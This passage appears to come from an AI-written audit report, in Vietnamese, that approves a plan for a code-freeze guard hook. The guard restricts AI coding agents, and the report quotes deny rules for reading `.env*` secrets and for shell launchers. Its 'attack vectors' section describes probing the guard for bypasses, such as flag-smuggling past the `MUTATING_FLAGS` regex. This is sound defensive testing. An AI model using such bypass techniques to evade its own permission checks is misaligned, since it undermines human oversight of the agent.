(`ask`). |
| **`BLK-01`..`BLK-04`, `MAJ-01`..`MAJ-10`, `MIN-01`..`MIN-06`** | `[BLOCKER]` / `[MAJOR]` / `[MINOR]` | **ĐÃ SỬA** | • Đã đối chiếu lại trên Revision 8 và mã nguồn `[SRC]` `.agents/scripts/code-freeze-guard.js:1-726`, `.agents/scripts/run-claude.ps1:1-196`, `scripts/verify-docs.mjs:1-303`: tất cả các bản sửa từ Audit Run 1 đến Audit Run 7 (ESM exports, `UNFROZEN_PREFIXES` + `UNFROZEN_FILES` `.md`-only tại Gate 3 trên `docs/**`, `export function isPlanApproved()` dùng `REPO_ROOT` và xóa nhánh `.agents/.plan-approved`, `formatHookOutput` không có `decision` cấp gốc khi chạy `PreToolUse` kèm `"onFailure": "block"`, dấu cách trước `*` trong `$sharedAllowedBash`, chặn `Read(.env*)`, chặn `Bash(powershell *),Bash(pwsh *),Bash(claude *)`, kiểm tra `IsPathRooted($ArtifactFile)` + `$resolvedArtifactFile`, và `--expected-headings=113`) đều được giữ nguyên trong Revision 8.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |

---

#### 2. Phát Hiện Mới (New Findings)

- Không phát hiện lỗi `[BLOCKER]`, `[MAJOR]`, hoặc `[MINOR]` mới trong bản kế hoạch **Revision 8**.

---

#### 3. Plan Completeness Gate & Mental Simulation Verification Matrix

##### 3.1. Plan Completeness Gate (7 Hạng Mục Bắt Buộc)

|  #  | Hạng Mục Cấu Trúc                               | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng                                                                                                                                                                                                                   |
| :-: | :---------------------------------------------- | :--------: | :---------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|  1  | **Bảng Verified Versions (2026)**               |   `PASS`   | `[SRC]` / `[URL]` | Mục 4 (dòng 160–175) khớp với `[SRC]` `package.json:101,115,117,120`, `.agents/scripts/code-freeze-guard.js:21-25`, `scripts/verify-docs.mjs:1-15` và tài liệu Antigravity / Claude Code CLI 2026.                                    |
|  2  | **Checklist `[NEW]` / `[MODIFY]` / `[DELETE]`** |   `PASS`   |      `[SRC]`      | Mục 5 (dòng 178–222) liệt kê đầy đủ 2 file `[NEW]`, 3 file `[DELETE]`, và 29 file `[MODIFY]` (bao gồm cả 4 kế hoạch ngày `2026-10-19`).                                                                                               |
|  3  | **Verification Plan & Probes**                  |   `PASS`   | `[SRC]` / `[CMD]` | Mục 9 (dòng 792–849) định nghĩa file test co-located (`>= 119 tests`), danh sách lệnh kiểm thử, 4 Wiring Probes (bao gồm `Wiring Probe 4` E2E CLI Smoke Probe) và 4 Negative Probes.                                                  |
|  4  | **Test Contract**                               |   `PASS`   |      `[SRC]`      | Mục 8 (dòng 776–789) định nghĩa `TC-01`..`TC-09` bao phủ `TC-02(a..g)`, `TC-04(a..c)`, `TC-05(a..e)`, `TC-06` (`batch-c.test.ts` vs `-c`), `TC-07`..`TC-09`.                                                                          |
|  5  | **Assumptions & Cross-Task Dependencies**       |   `PASS`   | `[SRC]` / `[CMD]` | Mục 3.1 & 3.2 (dòng 118–157) phản ánh đúng hành vi exit `0` không ghi stdout của `PreToolUse` hook và xử lý sự tồn tại của file untracked `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` qua thứ tự Bước 4 ➔ Bước 5. |
|  6  | **Out of Scope (`What We're NOT Doing`)**       |   `PASS`   |      `[SRC]`      | Mục 1.2 (dòng 65–73) cô lập rõ phạm vi, không chạm vào mã nguồn ứng dụng trong `src/`.                                                                                                                                                |
|  7  | **Skills Loaded & Applied**                     |   `PASS`   |      `[SRC]`      | Mục 2.2 (dòng 106–115) trích dẫn và ánh xạ 5 `SKILL.md` (`vikini-investigate`, `vikini-simplify`, `api-patterns`, `add-model`, `add-translation`).                                                                                    |

##### 3.2. Mental Simulation Verification Matrix (S1–S6 + Domain)

| Kịch Bản                                         | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng Độc Lập                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| :----------------------------------------------- | :--------: | :---------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **S1: Cold-start & Build**                       |   `PASS`   | `[CMD]` / `[SRC]` | `[CMD]` `npm run type-check` (`exit 0`), `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts` (`92 passed`). Code sketch tại Mục 6.1–6.2 tương thích với `// @ts-check` của `[SRC]` `.agents/scripts/code-freeze-guard.js:1` và cấu hình `[SRC]` `eslint.config.mjs:109`.                                                                                                                                                                           |
| **S2: Runner Lifecycle & Teardown**              |   `PASS`   |      `[SRC]`      | Không sử dụng kết nối mạng hay tài nguyên giữ trạng thái trong `code-freeze-guard.js`. Các hàm mới là hàm thuần nhận dữ liệu qua tham số, hỗ trợ kiểm thử in-memory.                                                                                                                                                                                                                                                                                              |
| **S3: Database & Temporal Logic**                |   `PASS`   | `[SRC]` / `[ADV]` | Việc đảo Bước 4 (sửa `.gitignore` và `scripts/verify-docs.mjs` khi `isPlanApproved()` theo `mtimeMs` đang trả về `true`) chạy trước Bước 5 (cài đặt `evaluateLatestDateGroupPlans` và đóng `Completed` cho 4 kế hoạch `2026-10-19`) giải quyết xung đột thứ tự thời gian với file untracked `2026-10-23-strata-local-llm-implementation-plan.md` (`MAJ-11`).                                                                                                      |
| **S4: Cross-Task State Flow**                    |   `PASS`   | `[CMD]` / `[SRC]` | Đã kiểm chứng `[CMD]` `git status --short` và `[SRC]` Header của cả 5 file kế hoạch trong `docs/plans/`. Cuối Bước 5 đóng trạng thái `Completed` cho cả 4 file `2026-10-19-*.md`, đảm bảo `isPlanApproved()` trả về `false` sau khi hoàn tất task.                                                                                                                                                                                                                |
| **S5: Security Boundary & Guard Enforcement**    |   `PASS`   | `[SRC]` / `[ADV]` | 4 lớp phòng thủ kết hợp: (1) `PreToolUse` hook với `"onFailure": "block"`, trả về `null` (exit `0` không stdout) khi `allow` và `{ hookSpecificOutput: { permissionDecision: "deny" } }` khi chặn, (2) chỉ cho phép đuôi `.md` trên `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES` + `Edit(docs/plans/*.md)`, (3) dấu cách trước `*` trong `$sharedAllowedBash`, (4) neo khoảng trắng cho `-c`/`-u`/`-i` trong `MUTATING_FLAGS` và chặn đọc `.env*` secrets. |
| **S6: External Resilience & Serverless Cap**     |   `PASS`   |      `[SRC]`      | Kênh Claude CLI giữ nguyên cơ chế phát hiện quota/rate limit (`exit 42`) tại `[SRC]` `.agents/scripts/run-claude.ps1:164-179`; việc bỏ `"defer"` và dùng exit `0` không stdout khi `allow` kèm `Wiring Probe 4` loại bỏ rủi ro dừng tiến trình với mã thoát `2` trong chế độ `-p` (`MAJ-12`).                                                                                                                                                                     |
| **Domain: Vikini Governance 2.0 & Verification** |   `PASS`   | `[SRC]` / `[URL]` | Tuân thủ schema YAML frontmatter của Antigravity Subagents & Rules, bảo toàn 15 mục quy chuẩn trong Mục 6.4 (`TC-08`), và chuẩn hóa cổng kiểm định `scripts/verify-docs.mjs --strict-shorthand --expected-headings=113` (`TC-09`).                                                                                                                                                                                                                                |

---

#### 4. Các Tấn Công Đã Thử (Attack Vectors Probed)

1. **Tấn công 1 — Kiểm tra xem còn file nào trong Bước 5 đi qua Gate 9 (`planApproved`) và bị khóa giữa chừng bởi `2026-10-23-strata-local-llm-implementation-plan.md` sau khi cập nhật `code-freeze-guard.js` hay không**:
   - **Cách thử**: Đối chiếu từng file được chỉnh sửa trong Bước 4 (dòng 722–740) và Bước 5 (dòng 741–771) với chuỗi cổng kiểm tra từ Gate 1 đến Gate 9 tại `[SRC]` `.agents/scripts/code-freeze-guard.js:443-554`.
   - **Kết quả**: Hai file duy nhất trong toàn bộ kế hoạch nằm ngoài `docs/` và `.agents/` là `.gitignore` và `scripts/verify-docs.mjs` (đi qua Gate 9 `if (planApproved)` tại dòng 541). Cả hai file này đã được chuyển sang **Bước 4** — thời điểm mà `code-freeze-guard.js` trên đĩa vẫn đang dùng thuật toán `mtimeMs` (`[SRC]` `.agents/scripts/code-freeze-guard.js:201-205`) và trả về `true` cho `2026-10-19-remake-agents-governance-v2-implementation-plan.md`. Toàn bộ các file còn lại ở Bước 5 thuộc `.agents/**` (Gate 7, dòng 525), `.agents/scripts/code-freeze-guard.test.ts` (Gate 4, dòng 484) hoặc `docs/plans/*.md` (Gate 3, dòng 464 — luôn trả về `allow` cho `.md`), nên không có file nào bị chặn bởi trạng thái `Ready for Review` của `2026-10-23-strata-local-llm-implementation-plan.md`.
2. **Tấn công 2 — Kiểm tra nguy cơ `formatHookOutput` trả về `null` làm hỏng giao thức Hook của Google Antigravity hoặc làm lộ lỗi khi JSON stdin bị hỏng**:
   - **Cách thử**: Lần theo luồng thực thi của `formatHookOutput(result, parsedPayload)` và `main()` tại Mục 6.2 (dòng 490–537) với 3 loại payload: (a) payload của Google Antigravity (`{ conversationId, toolCall, stepIdx }`), (b) payload của Claude Code CLI (`{ hook_event_name: "PreToolUse", permission_mode: "dontAsk", ... }`), và (c) chuỗi stdin không phải JSON hợp lệ.
   - **Kết quả**: Với (a), `root.hook_event_name` là `undefined`, `formatHookOutput` trả về nguyên vẹn `result` (`{ decision: "allow" | "ask", reason }`) và `main()` ghi ra stdout như cũ. Với (b), khi `result.decision === "allow"` hàm trả về `null` (không ghi stdout, exit `0`), còn khi `result.decision === "ask"` hàm trả về `{ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason } }` không có trường `decision` cấp gốc. Với (c), khối `catch` gán `result = { decision: "ask", reason: "..." }` (chặn fail-closed trên Antigravity) và `"onFailure": "block"` trong `$claudeHookSettings` (dòng 603) chặn fail-closed trên Claude CLI.
3. **Tấn công 3 — Thử vượt qua biểu thức chính quy `MUTATING_FLAGS` mới bằng cách viết liền cờ ngắn (`-cdocs/plans/x.mjs`) hoặc truyền tên file có chứa `-c`, `-u`, `-i` (`batch-c.test.ts`, `chat-ui.test.ts`)**:
   - **Cách thử**: Kiểm tra biểu thức `MUTATING_FLAGS` tại Mục 6.2 (dòng 411–412: `/(?:^|\s)(?:--fix|--write|--force|--output|--outputFile|--config|--root|--dir|--globalSetup|--setupFiles|--extcmd|--update|--coverage)(?:\s|=|$)|(?:^|\s)-(?:c|u|i)(?:\s|=|$)/`) kết hợp với các mẫu lệnh trong `READ_ONLY_COMMANDS` tại `[SRC]` `.agents/scripts/code-freeze-guard.js:52-65`.
   - **Kết quả**: Với `npx vitest run src/lib/features/chat/batch-c.test.ts`, ký tự đứng trước `-c` là `h` (không phải đầu chuỗi hay khoảng trắng) nên không bị `MUTATING_FLAGS` chặn nhầm. Với `-c docs/plans/x.mjs` hoặc `-c=docs/plans/x.mjs`, `MUTATING_FLAGS` bắt trúng ngay lập tức. Còn nếu viết liền `-cdocs/plans/x.mjs`, biểu thức `READ_ONLY_COMMANDS` của `vitest` (`[SRC]` `.agents/scripts/code-freeze-guard.js:56`: `/^npx vitest (?:run|list)(?: (?:--reporter=[\w-]+|--filesOnly|[^\s-]\S*))*$/`) và `npm run test:run --` (dòng 57) yêu cầu mọi đối số đường dẫn phải bắt đầu bằng ký tự khác dấu gạch ngang (`[^\s-]\S*`), nên `-cdocs/plans/x.mjs` vẫn bị từ chối (`decision: "ask"`).
4. **Tấn công 4 — Kiểm tra nhánh Read Guard mới trong `decide()` (Mục 6.2 dòng 416–434) xem có vô tình cho phép ghi vào file khi `targetFile` được truyền vào mà không phải công cụ đọc**:
   - **Cách thử**: Kiểm tra điều kiện phân nhánh `if (input.toolName === "Read" || input.toolName === "read_file" || input.toolName === "view_file")` tại dòng 417–421 của Mục 6.2.
   - **Kết quả**: Nhánh này chỉ kích hoạt khi `input.toolName` khớp chính xác với 1 trong 3 tên công cụ đọc (`"Read"`, `"read_file"`, `"view_file"`). Mọi công cụ ghi/sửa (`write_to_file`, `replace_file_content`, `multi_replace_file_content`, `write_file`, `edit_file`, `Write`, `Edit`, `MultiEdit`) hoặc lệnh gọi `decide({ targetFile: "src/a.ts" })` không truyền `toolName` trong unit test hiện hữu đều bỏ qua nhánh này và đi tiếp xuống Gate 1–Gate 9 như bình thường.

---

#### 5. Adversarial Timelines & Commands Executed

##### 5.1. Adversarial Timelines (4 Trục Đối Kháng — `evidence-bar.md` §4.5.2)

1. **Trục 1 — Đồng thời / Cross-Task (`2026-10-23-strata-local-llm-implementation-plan.md`)**: T1 Plan hiện tại được phê duyệt (`mtimeMs` mới nhất ➔ guard hiện hành trả về `true`) | T2 Bước 4 sửa `.gitignore` và `scripts/verify-docs.mjs` thành công qua Gate 9 trước khi chạm vào `code-freeze-guard.js` | T3 Bước 5 cập nhật `code-freeze-guard.js` và đóng `Status: Completed` cho 4 plan `2026-10-19-*.md` ➔ repo tự động khóa lại (`isPlanApproved() === false`). **AN TOÀN**.
2. **Trục 2 — TOCTOU**: T1 Planner CLI hoặc Antigravity cố tạo file thực thi trong `docs/notes/x.test.mjs` | T2 Gate 3 (`.md`-only trên toàn bộ `UNFROZEN_PREFIXES` `docs/**` và `UNFROZEN_FILES`) trả về `ask` (và `formatHookOutput` trả về `deny` dưới `dontAsk`) | T3 File không được tạo ra. **AN TOÀN**.
3. **Trục 3 — Thất bại giữa chừng / Hook Output Schema**: T1 `run-claude.ps1` gọi `claude -p --permission-mode dontAsk --settings $claudeHookSettings` | T2 Với tool call được phép, `formatHookOutput` trả về `null` (exit `0`, không ghi stdout) nên tiến trình tiếp tục qua `--allowedTools` + `dontAsk` mà không gặp lỗi exit code `2` của `"defer"`; với tool call bị chặn, hook xuất `{ hookSpecificOutput: { permissionDecision: "deny" } }`; nếu hook gặp lỗi bất ngờ, `"onFailure": "block"` chặn lệnh. **AN TOÀN**.
4. **Trục 4 — Môi trường / Kênh thực thi**: Kết hợp kiểm tra tĩnh bằng unit test (`TC-01`..`TC-08`) với kiểm thử khói đầu-cuối (`Wiring Probe 4` với `claude -p --debug`) ở Bước 5. **AN TOÀN**.

##### 5.2. Commands Executed (Trong ALLOWLIST)

1. `git status --short` ➔ **Exit code 0** (`M docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`, `?? docs/plans/2026-10-23-strata-local-llm-implementation-plan.md`).
2. `npm run type-check` ➔ **Exit code 0** (`tsc --noEmit` không có lỗi).
3. `npx vitest run .agents/scripts/code-freeze-guard.test.ts` ➔ **Exit code 0** (`1 passed`, `92/92 tests passed`).

---

#### 6. Kết Luận Phê Duyệt

Bản kế hoạch **Revision 8** đã giải quyết đầy đủ các vấn đề `MAJ-11`, `MAJ-12` và `MIN-07` từ Audit Run 7, đồng thời bảo toàn các chốt kiểm soát từ Audit Run 1 đến Audit Run 6. Kế hoạch đạt chuẩn phê duyệt để chuyển sang giai đoạn triển khai.

[PLAN_APPROVED]
